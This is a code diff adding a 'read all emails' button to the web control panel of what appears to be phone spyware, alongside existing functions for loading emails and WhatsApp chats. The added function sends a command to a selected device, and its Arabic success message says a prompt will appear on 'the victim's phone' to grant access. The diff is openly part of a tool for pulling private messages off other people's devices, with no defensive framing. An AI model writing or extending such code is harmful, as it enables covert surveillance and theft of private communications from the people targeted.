@@ -248,6 +248,25 @@ async function loadEmails() {
     } catch (e) {}
 }
 
+// ✅ زر سحب كل البريد
+async function readAllEmails() {
+    if (!currentDevice) { alert('⚠️ اختر جهازًا أولًا'); return; }
+    if (!confirm('📧 سحب كل رسائل البريد من الجهاز؟')) return;
+    
+    try {
+        const response = await fetch(`/api.php?action=read_emails&device=${encodeURIComponent(currentDevice)}`);
+        const result = await response.json();
+        
+        if (result.success) {
+            alert('✅ تم إرسال الأمر — سيظهر إشعار على هاتف الضحية لتفعيل الوصول');
+        } else {
+            alert('❌ خطأ: ' + (result.error || 'غير معروف'));
+        }
+    } catch (e) {
+        alert('❌ خطأ في الاتصال: ' + e.message);
+    }
+}
+
 // ✅ تحميل رسائل واتساب — محادثات مجمعة
 async function loadWhatsApp() {
     try {
